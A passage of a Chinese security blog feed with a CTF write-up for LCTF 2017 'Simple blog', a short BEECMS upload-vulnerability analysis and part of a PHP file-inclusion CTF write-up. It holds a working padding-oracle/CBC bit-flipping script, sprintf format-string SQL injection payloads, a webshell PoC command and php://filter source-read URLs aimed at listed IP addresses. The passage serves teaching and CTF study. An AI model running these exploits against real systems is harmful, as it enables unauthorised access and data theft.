class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">	$password = $_POST[<span class="string">'password'</span>];</div><div class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">  		get_identity();</div><div class="line">  		header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">  	&#125;<span class="keyword">else</span>&#123;</div><div class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">  	&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>admin.php的源码后面放出。</p>
<p>经过测试，存在账号和密码，分别为admin和admin。在login.php页面登陆后会跳转到admin.php。默认情况下，由于并非真实admin，在跳转后会显示you are not admin.</p>
<h2 id="CBC翻转字节攻击"><a href="#CBC翻转字节攻击" class="headerlink" title="CBC翻转字节攻击"></a>CBC翻转字节攻击</h2><p>鉴于篇幅的原因，关于CBC翻转字节攻击这里就不多讲了。在观察login.php，以及加上一点点的社工后，可以发现跟NJCTF的某题神似。借<a href="http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/" target="_blank" rel="external">网络的脚本</a>，修改了一下，增加登陆页面的验证以及跑出token后的结束标志：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">url=<span class="string">'http://111.231.111.54/login.php'</span></div><div class="line">N=<span class="number">16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></div><div class="line">    header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+phpsession+<span class="string">";token="</span>+token&#125;</div><div class="line">    result=requests.post(url,headers=header)</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></div><div class="line">    l=len(string)</div><div class="line">    <span class="keyword">if</span> l!=N:</div><div class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></div><div class="line">    get=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))</div><div class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</div><div class="line">            result=inject_token(base64.b64encode(c))</div><div class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                get=chr(j^i)+get</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> get</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(url)</span>:</span></div><div class="line">    payload = &#123;</div><div class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</div><div class="line">        <span class="string">"password"</span>:<span class="string">"admin"</span></div><div class="line">    &#125;</div><div class="line">    coo1 = &#123;</div><div class="line">        <span class="string">"PHPSESSID"</span>:<span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    &#125;</div><div class="line">    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=<span class="keyword">False</span>)</div><div class="line">    token = r.headers[<span class="string">'Set-Cookie'</span>].replace(<span class="string">"%3D"</span>,<span class="string">'='</span>).replace(<span class="string">"%2F"</span>,<span class="string">'/'</span>).replace(<span class="string">"%2B"</span>,<span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</div><div class="line">    session = <span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></div><div class="line">    <span class="keyword">return</span> session, token</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    phpsession,token = login(url)</div><div class="line"></div><div class="line">    middle1=padding_oracle(N)</div><div class="line">    <span class="keyword">print</span> middle1</div><div class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></div><div class="line">    <span class="keyword">if</span>(len(middle1)+<span class="number">1</span>==<span class="number">16</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">            middle=chr(i)+middle1</div><div class="line">            <span class="keyword">print</span> <span class="string">"token:"</span>+token</div><div class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span>+middle</div><div class="line">            plaintext=xor(middle,token);</div><div class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span>+plaintext</div><div class="line">            des=pad(<span class="string">'admin'</span>,N)</div><div class="line">            tmp=<span class="string">""</span></div><div class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</div><div class="line">                tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))</div><div class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</div><div class="line">            result=inject_token(base64.b64encode(tmp))</div><div class="line">            <span class="comment"># print result.content</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"Login Form"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content <span class="keyword">and</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</div><div class="line">                <span class="keyword">print</span> result.content</div><div class="line">                <span class="keyword">print</span> <span class="string">"success"</span></div><div class="line">                exit()</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/6.png?raw=true" alt=""></p>
<p>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">token  HGV8cWwzDgk2CBooPRYtXA==</div><div class="line">PHPSESSID  j297k7o6d8stcbvi2c23naj5j6</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/7.png?raw=true" alt=""></p>
<p>成功进入后台。</p>
<h2 id="格式化串sql注入"><a href="#格式化串sql注入" class="headerlink" title="格式化串sql注入"></a>格式化串sql注入</h2><p>这里放上admin.php的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	$result = mysql_query($sql,$con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">		<span class="keyword">die</span>();</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在看到sprintf后，可以很直接的联系到前阵子爆出的关于wordpress的格式化字符串SQL注入漏洞。传送门：<a href="https://paper.seebug.org/386/" target="_blank" rel="external">从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</a></p>
<p>基于泄露出的源码，添加一些变量打印语句，本地测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$con = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	print_r(<span class="string">"GET[id] =&gt; "</span>.$_GET[<span class="string">'id'</span>].<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>],$con);</div><div class="line">	print_r(<span class="string">"\$id =&gt; "</span>.$id.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		print_r(<span class="string">"GET[title] =&gt; "</span>.$_GET[<span class="string">'title'</span>].<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		print_r(<span class="string">"escape string tile: \$title =&gt; "</span>.$title.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">		print_r(<span class="string">"After first sprintf : \$title =&gt; "</span>.$title.<span class="string">"&lt;/br&gt;"</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	print_r(<span class="string">"sql =&gt; "</span>.$sql);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/index.php?id=1&amp;title=flag%1$&apos;%20 or 1=1%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/8.png?raw=true" alt=""></p>
<p>观察传入的title参数。</p>
<p>title传入的值为<code>flag%1$&#39; or 1=1#</code>，经过<code>mysql_real_escape_string</code>，会使得单引号<code>&#39;</code>前加上斜杠，也就是图片中的第四行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">escape string tile: $title =&gt; flag%1$\&apos; or 1=1#</div></pre></td></tr></table></figure></p>
<p>接下来执行一次<code>sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);</code>，也就是将前面得到的title值title值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">After first sprintf : $title =&gt; AND title=&apos;flag%1$\&apos; or 1=1#&apos;</div></pre></td></tr></table></figure></p>
<p>接下来，又一次执行了<code>sprintf</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id);</div></pre></td></tr></table></figure></p>
<p>由于PHP的sprintf中，<code>%1$\</code>这样的语法，百分号<code>%</code>后面的数表示使用第几个参数，<code>$</code>后面的表示类型，常见的类型比如<code>s</code>表示字符串等等。比如<code>%1$s</code>，表示使用第一个参数，类型为字符串（%s）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// 注format中，为防止 $ 被转义，在前面加了转义符。对于sprintf来说，即 %1$s</span></div><div class="line">$format1 = <span class="string">"hello,%1\$s one&lt;br/&gt;"</span>;</div><div class="line">$format2 = <span class="string">"hello,%2\$s two&lt;br/&gt;"</span>;</div><div class="line">$format3 = <span class="string">"hello,%1\$\' three&lt;br/&gt;"</span>;</div><div class="line">$format4 = <span class="string">"hello,%\$\' four&lt;br/&gt;"</span>;</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 1 : "</span>.$format1);</div><div class="line">print_r(<span class="string">"Result: "</span>.sprintf($format1,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 2 : "</span>.$format2);</div><div class="line">print_r(<span class="string">"Result: "</span>.sprintf($format2,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 3 : "</span>.$format3);</div><div class="line">print_r(sprintf($format3,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"format string 4 : "</span>.$format4);</div><div class="line">print_r(sprintf($format4,<span class="string">"chybeta-1"</span>,<span class="string">"chybeta-2"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/17.png?raw=true" alt=""></p>
<p>前两个示例是演示选择参数的用法。第三个和前两个比较，变成类型<code>%\</code>，会直接跳过不处理，并直接输出。第四个和第三个对比，少了参数选择，这会导致报错，无法正常打印。</p>
<p>回到前面的sprintf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id);</div></pre></td></tr></table></figure></p>
<p>通过百分号后的1，选择了一个参数（即id）不会爆错。利用类型<code>%\</code>，使得跳过。而原本在<code>\</code>后面的单引号，由于前面斜杠被当作了sprintf的类型，得以成功逃逸。</p>
<p>剩下的工作就是盲注了，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://111.231.111.54/admin.php?id=1&amp;title=flag%1$&apos;%20 or (SELECT%09GROUP_CONCAT(f14g)%09FROM%09web1.key) &lt; 255 #</div></pre></td></tr></table></figure></p>
<p>脚本写得太丑，基于<a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">以前的写的框架</a>修改的，这里就不贴啦。</p>
<p>最后注出来的表结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库：web1  </div><div class="line">表名:key  </div><div class="line">字段名:f14g</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/1.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LCTF&#123;N0!U_hacked_My_b1og&#125;</div></pre></td></tr></table></figure></p>
<p>回到PHP的sprintf中，sprintf能吃掉<code>\</code>呢？在<a href="https://github.com/php/php-src/blob/master/ext/standard/formatted_print.c#L643" target="_blank" rel="external">源码</a>中，采用了case进行分类处理，而对于未知情况，则采取break。明显<code>%\</code>是未知情况，因此成功绕过。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>源码泄露</li>
<li>CBC翻转字节攻击</li>
<li>格式化串sql注入</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;更新：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CBC翻转攻击脚本&lt;/li&gt;
&lt;li&gt;格式化字符串sql注入详细解答&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！&lt;/p&gt;
&lt;p&gt;LCTF 2017-Simple blog-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BEECMS v4.0_R_20160525 文件上传漏洞分析</title>
    <link href="http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/11/14/BEECMS-v4-0-R-20160525-文件上传漏洞分析/</id>
    <published>2017-11-14T05:12:50.000Z</published>
    <updated>2017-11-20T06:04:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这个洞早就出来了。<br>只不过几天前看到<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579" target="_blank" rel="external">cnvd</a>上有人提交了。<br>漏洞利用过程挺好玩的，分析一波。</p>
<a id="more"></a>
<h1 id="漏洞复现：cmspoc"><a href="#漏洞复现：cmspoc" class="headerlink" title="漏洞复现：cmspoc:"></a>漏洞复现：<a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmspoc</a>:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -u http://vuln.com/index.php -t beecms -s v40_fileupload_gethshell.py</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171115/tty.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="变量覆盖进后台"><a href="#变量覆盖进后台" class="headerlink" title="变量覆盖进后台"></a>变量覆盖进后台</h2><h2 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实这个洞早就出来了。&lt;br&gt;只不过几天前看到&lt;a href=&quot;http://www.cnvd.org.cn/flaw/show/CNVD-2017-31579&quot;&gt;cnvd&lt;/a&gt;上有人提交了。&lt;br&gt;漏洞利用过程挺好玩的，分析一波。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>一道CTF题：PHP文件包含</title>
    <link href="http://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://chybeta.github.io/2017/11/09/一道CTF题：PHP文件包含/</id>
    <published>2017-11-09T12:10:14.000Z</published>
    <updated>2017-11-10T18:50:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到了几道题，这是其中之一。<br>PHP文件包含 Session</p>
<a id="more"></a>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171109/4.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h2><p>点击login，发现链接变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=login.php</div></pre></td></tr></table></figure></p>
<p>推测文件包含。</p>
<h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://54.222.188.152:22589/index.php</div><div class="line">?action=php://filter/read=convert.base64-encode/resource=login.php</div></pre></td></tr></table></figure></p>
<p>得到login.php源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require_once('config.php');</div><div class="line">	session_start();</div><div class="line">	if($_SESSION['username']) &#123;</div><div class="line">		header('Location: index.php');</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	if($_POST['username'] &amp;&amp; $_POST['password']) &#123;</div><div class="line">		$username = $_POST['username'];</div><div class="line">		$password = md5($_POST['password']);</div><div class="line"></div><div class="line">        $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname);</div><div class="line"></div><div class="line">        if ($mysqli-&gt;connect_errno) &#123;</div><div class="line">            die("could not connect to the database:\n" . $mysqli-&gt;connect_error);</div><div class="line">        &#125;</div><div class="line">        $sql = "select password from user where username=?";</div><div class="line">        $stmt = $mysqli-&gt;prepare($sql);</div><div class="line">        $stmt-&gt;bind_param("s", $username);</div><div class="line">        $stmt-&gt;bind_result($res_password);</div><div class="line">        $stmt-&gt;execute();</div><div class="line"></div><div class="line">        $stmt-&gt;fetch();</div><div class="line">        if ($res_password == $password) &#123;</div><div class="line">            $_SESSION['username'] = base64_encode($username);</div><div class="line">            header("location:index.php");</div><div class="line">        &#125; else &#123;</div><div class="line">            die("Invalid user name or password");</div><div class="line">        &#125;</div><div class="line">        $stmt-&gt;close();</div><div class="line">        